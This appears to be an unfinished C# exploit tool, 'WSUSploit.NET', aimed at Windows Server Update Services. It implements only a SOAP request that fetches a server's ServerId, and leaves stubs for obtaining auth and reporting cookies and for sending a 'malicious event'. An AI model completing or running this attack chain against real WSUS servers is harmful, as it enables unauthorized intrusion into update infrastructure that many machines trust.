using System;
using System.Text;
using System.Net.Http;
using System.Xml.Linq;
using WSUSploit.NET;

if (args.Length == 0)
{
    Console.WriteLine("Usage: WSUSploit.NET <URL>");
    return;
}

Uri serverUri = new Uri(args[0]);

Console.WriteLine($"[*] Running against {serverUri}");

WSUSServer server = new WSUSServer(serverUri);
string serverId = await server.GetServerId();


namespace WSUSploit.NET
{
    class WSUSServer
    {   
        public string ServerId { get; set; }
        public int Port { get; set; }
        public Uri URL { get; set; }
        public string AuthCookie { get; set; }
        public string ReportingCookie { get; set; }

        private readonly HttpClient _httpClient;

        public WSUSServer(Uri url)
        {   
            if(url.Port != 8530 && url.Port != 8531)
            {
                Console.WriteLine("[!] WARNING: Not specifying standard WSUS port 8530/8531");
            }

            _httpClient = new HttpClient();
            _httpClient.BaseAddress = url;
            _httpClient.Timeout = TimeSpan.FromSeconds(30); 

            URL = url;
        }

        public async Task<string> GetServerId()
        {
            Console.WriteLine("[*] Fetching Server ID..."); 

            string soapBody = @"<?xml version=""1.0"" encoding=""utf-8""?>
            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
            <soap:Body>
            <GetRollupConfiguration xmlns=""http://www.microsoft.com/SoftwareDistribution"">
            <cookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
            </GetRollupConfiguration>
            </soap:Body>
            </soap:Envelope>";

            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/GetRollupConfiguration");
            
            var response = await _httpClient.PostAsync(this.URL + "/ReportingWebService/ReportingWebService.asmx", content);

            var responseBody = await response.Content.ReadAsStringAsync();
            
            // Parse the XML
            XDocument xmlDoc = XDocument.Parse(responseBody);

            // Define namespaces
            XNamespace soapNs = "http://schemas.xmlsoap.org/soap/envelope/";
            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution";

            // Extract ServerId
            string serverId = xmlDoc
                .Descendants(msNs + "ServerId")
                .FirstOrDefault()?.Value;

            Console.WriteLine($"[*] ServerId: {serverId}");

            return serverId;
        }

        string GetAuthCookie(string target, string serverId)
        {
            return "";
        }

        string GetReportingCookie(string target, string authCookie)
        {
            return "";
        }

        void SendMaliciousEvent(string target, string cookie)
        {

        }
    }
}